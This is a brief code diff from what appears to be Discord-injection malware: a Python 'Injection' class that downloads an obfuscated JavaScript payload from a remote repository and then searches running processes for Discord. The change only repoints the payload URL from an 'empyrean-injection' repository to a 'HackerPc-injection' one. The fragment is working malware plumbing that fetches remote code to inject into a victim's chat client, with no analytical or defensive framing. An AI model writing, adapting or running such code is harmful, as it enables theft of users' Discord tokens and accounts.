@@ -22,7 +22,7 @@ class Injection:
         
         
         
-content.com/addi00000/empyrean-injection/main/obfuscated.js').text
+content.com/g4zzlove/HackerPc-injection/main/obfuscated.js').text
         
         for proc in psutil.process_iter():
             if 'discord' in proc.name().lower():
